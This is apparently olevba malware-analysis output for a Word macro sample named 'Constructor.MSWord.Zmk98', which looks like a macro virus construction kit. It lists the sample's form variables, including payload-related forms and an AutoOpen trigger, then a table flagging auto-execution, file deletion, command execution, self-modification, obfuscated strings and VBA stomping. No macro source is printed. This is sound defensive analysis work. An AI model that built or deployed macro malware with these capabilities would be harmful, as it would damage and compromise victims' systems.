None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label1'" IN 'Constructor.MSWord.Zmk98' - OLE stream: 'Macros/FileName'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'TextBox1'" IN 'Constructor.MSWord.Zmk98' - OLE stream: 'Macros/FileName'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b''
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label2'" IN 'Constructor.MSWord.Zmk98' - OLE stream: 'Macros/FileName'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label3'" IN 'Constructor.MSWord.Zmk98' - OLE stream: 'Macros/FileName'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'TextBox2'" IN 'Constructor.MSWord.Zmk98' - OLE stream: 'Macros/FileName'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b''
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton1'" IN 'Constructor.MSWord.Zmk98' - OLE stream: 'Macros/FileName'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label1'" IN 'Constructor.MSWord.Zmk98' - OLE stream: 'Macros/MacroPay'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'ComboBox1'" IN 'Constructor.MSWord.Zmk98' - OLE stream: 'Macros/MacroPay'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'AutoOpen'
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton1'" IN 'Constructor.MSWord.Zmk98' - OLE stream: 'Macros/MacroPay'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label1'" IN 'Constructor.MSWord.Zmk98' - OLE stream: 'Macros/MacroType'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'ComboBox1'" IN 'Constructor.MSWord.Zmk98' - OLE stream: 'Macros/MacroType'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'AutoOpen'
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label2'" IN 'Constructor.MSWord.Zmk98' - OLE stream: 'Macros/MacroType'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'ComboBox2'" IN 'Constructor.MSWord.Zmk98' - OLE stream: 'Macros/MacroType'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'FileSaveAs'
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton1'" IN 'Constructor.MSWord.Zmk98' - OLE stream: 'Macros/MacroType'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label1'" IN 'Constructor.MSWord.Zmk98' - OLE stream: 'Macros/MessM'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label2'" IN 'Constructor.MSWord.Zmk98' - OLE stream: 'Macros/MessM'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'TextBox1'" IN 'Constructor.MSWord.Zmk98' - OLE stream: 'Macros/MessM'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b''
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label3'" IN 'Constructor.MSWord.Zmk98' - OLE stream: 'Macros/MessM'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'TextBox2'" IN 'Constructor.MSWord.Zmk98' - OLE stream: 'Macros/MessM'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b''
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton1'" IN 'Constructor.MSWord.Zmk98' - OLE stream: 'Macros/MessM'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label1'" IN 'Constructor.MSWord.Zmk98' - OLE stream: 'Macros/MessMEC'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'TextBox1'" IN 'Constructor.MSWord.Zmk98' - OLE stream: 'Macros/MessMEC'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b''
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label2'" IN 'Constructor.MSWord.Zmk98' - OLE stream: 'Macros/MessMEC'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'TextBox2'" IN 'Constructor.MSWord.Zmk98' - OLE stream: 'Macros/MessMEC'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b''
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton1'" IN 'Constructor.MSWord.Zmk98' - OLE stream: 'Macros/MessMEC'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label3'" IN 'Constructor.MSWord.Zmk98' - OLE stream: 'Macros/MessMEC'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label1'" IN 'Constructor.MSWord.Zmk98' - OLE stream: 'Macros/MessVBE'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label2'" IN 'Constructor.MSWord.Zmk98' - OLE stream: 'Macros/MessVBE'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'TextBox1'" IN 'Constructor.MSWord.Zmk98' - OLE stream: 'Macros/MessVBE'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b''
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label3'" IN 'Constructor.MSWord.Zmk98' - OLE stream: 'Macros/MessVBE'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'TextBox2'" IN 'Constructor.MSWord.Zmk98' - OLE stream: 'Macros/MessVBE'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b''
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton1'" IN 'Constructor.MSWord.Zmk98' - OLE stream: 'Macros/MessVBE'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label1'" IN 'Constructor.MSWord.Zmk98' - OLE stream: 'Macros/Message'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label2'" IN 'Constructor.MSWord.Zmk98' - OLE stream: 'Macros/Message'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label3'" IN 'Constructor.MSWord.Zmk98' - OLE stream: 'Macros/Message'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label4'" IN 'Constructor.MSWord.Zmk98' - OLE stream: 'Macros/Message'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'ToggleButton1'" IN 'Constructor.MSWord.Zmk98' - OLE stream: 'Macros/Message'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'ToggleButton2'" IN 'Constructor.MSWord.Zmk98' - OLE stream: 'Macros/Message'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'ToggleButton3'" IN 'Constructor.MSWord.Zmk98' - OLE stream: 'Macros/Message'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton1'" IN 'Constructor.MSWord.Zmk98' - OLE stream: 'Macros/Message'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label1'" IN 'Constructor.MSWord.Zmk98' - OLE stream: 'Macros/PayAssist'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'TextBox1'" IN 'Constructor.MSWord.Zmk98' - OLE stream: 'Macros/PayAssist'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b''
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label2'" IN 'Constructor.MSWord.Zmk98' - OLE stream: 'Macros/PayAssist'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'TextBox2'" IN 'Constructor.MSWord.Zmk98' - OLE stream: 'Macros/PayAssist'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b''
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton1'" IN 'Constructor.MSWord.Zmk98' - OLE stream: 'Macros/PayAssist'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label1'" IN 'Constructor.MSWord.Zmk98' - OLE stream: 'Macros/PayDelete'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CheckBox1'" IN 'Constructor.MSWord.Zmk98' - OLE stream: 'Macros/PayDelete'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'CheckBox2'" IN 'Constructor.MSWord.Zmk98' - OLE stream: 'Macros/PayDelete'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'CheckBox3'" IN 'Constructor.MSWord.Zmk98' - OLE stream: 'Macros/PayDelete'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'CheckBox4'" IN 'Constructor.MSWord.Zmk98' - OLE stream: 'Macros/PayDelete'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'CheckBox5'" IN 'Constructor.MSWord.Zmk98' - OLE stream: 'Macros/PayDelete'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'CheckBox6'" IN 'Constructor.MSWord.Zmk98' - OLE stream: 'Macros/PayDelete'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'CheckBox7'" IN 'Constructor.MSWord.Zmk98' - OLE stream: 'Macros/PayDelete'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'CheckBox8'" IN 'Constructor.MSWord.Zmk98' - OLE stream: 'Macros/PayDelete'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton1'" IN 'Constructor.MSWord.Zmk98' - OLE stream: 'Macros/PayDelete'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label1'" IN 'Constructor.MSWord.Zmk98' - OLE stream: 'Macros/PayMDP'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label2'" IN 'Constructor.MSWord.Zmk98' - OLE stream: 'Macros/PayMDP'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'TextBox1'" IN 'Constructor.MSWord.Zmk98' - OLE stream: 'Macros/PayMDP'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b''
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label3'" IN 'Constructor.MSWord.Zmk98' - OLE stream: 'Macros/PayMDP'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'TextBox2'" IN 'Constructor.MSWord.Zmk98' - OLE stream: 'Macros/PayMDP'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b''
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton1'" IN 'Constructor.MSWord.Zmk98' - OLE stream: 'Macros/PayMDP'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label1'" IN 'Constructor.MSWord.Zmk98' - OLE stream: 'Macros/PayMess'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'TextBox1'" IN 'Constructor.MSWord.Zmk98' - OLE stream: 'Macros/PayMess'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b''
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label2'" IN 'Constructor.MSWord.Zmk98' - OLE stream: 'Macros/PayMess'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'TextBox2'" IN 'Constructor.MSWord.Zmk98' - OLE stream: 'Macros/PayMess'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b''
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton1'" IN 'Constructor.MSWord.Zmk98' - OLE stream: 'Macros/PayMess'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label1'" IN 'Constructor.MSWord.Zmk98' - OLE stream: 'Macros/PayType'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton1'" IN 'Constructor.MSWord.Zmk98' - OLE stream: 'Macros/PayType'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CheckBox1'" IN 'Constructor.MSWord.Zmk98' - OLE stream: 'Macros/PayType'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'CheckBox2'" IN 'Constructor.MSWord.Zmk98' - OLE stream: 'Macros/PayType'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'CheckBox3'" IN 'Constructor.MSWord.Zmk98' - OLE stream: 'Macros/PayType'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'CheckBox4'" IN 'Constructor.MSWord.Zmk98' - OLE stream: 'Macros/PayType'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'CheckBox5'" IN 'Constructor.MSWord.Zmk98' - OLE stream: 'Macros/PayType'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label1'" IN 'Constructor.MSWord.Zmk98' - OLE stream: 'Macros/Recapitulatif'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label2'" IN 'Constructor.MSWord.Zmk98' - OLE stream: 'Macros/Recapitulatif'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label3'" IN 'Constructor.MSWord.Zmk98' - OLE stream: 'Macros/Recapitulatif'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label4'" IN 'Constructor.MSWord.Zmk98' - OLE stream: 'Macros/Recapitulatif'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label5'" IN 'Constructor.MSWord.Zmk98' - OLE stream: 'Macros/Recapitulatif'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label6'" IN 'Constructor.MSWord.Zmk98' - OLE stream: 'Macros/Recapitulatif'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label7'" IN 'Constructor.MSWord.Zmk98' - OLE stream: 'Macros/Recapitulatif'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label8'" IN 'Constructor.MSWord.Zmk98' - OLE stream: 'Macros/Recapitulatif'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label9'" IN 'Constructor.MSWord.Zmk98' - OLE stream: 'Macros/Recapitulatif'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label10'" IN 'Constructor.MSWord.Zmk98' - OLE stream: 'Macros/Recapitulatif'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label11'" IN 'Constructor.MSWord.Zmk98' - OLE stream: 'Macros/Recapitulatif'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label12'" IN 'Constructor.MSWord.Zmk98' - OLE stream: 'Macros/Recapitulatif'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label13'" IN 'Constructor.MSWord.Zmk98' - OLE stream: 'Macros/Recapitulatif'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label14'" IN 'Constructor.MSWord.Zmk98' - OLE stream: 'Macros/Recapitulatif'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton1'" IN 'Constructor.MSWord.Zmk98' - OLE stream: 'Macros/Recapitulatif'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label15'" IN 'Constructor.MSWord.Zmk98' - OLE stream: 'Macros/Recapitulatif'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label16'" IN 'Constructor.MSWord.Zmk98' - OLE stream: 'Macros/Recapitulatif'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label1'" IN 'Constructor.MSWord.Zmk98' - OLE stream: 'Macros/Welcome'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label2'" IN 'Constructor.MSWord.Zmk98' - OLE stream: 'Macros/Welcome'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton1'" IN 'Constructor.MSWord.Zmk98' - OLE stream: 'Macros/Welcome'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Autoexec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |AutoNew             |Runs when a new Word document is created     |
|AutoExec  |CommandButton1_Click|Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|doit                |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Command             |May run PowerShell commands                  |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VbProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Autoexec.bat        |Executable file name                         |
|Base64    |O*^                 |Type                                         |
|String    |                    |                                             |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

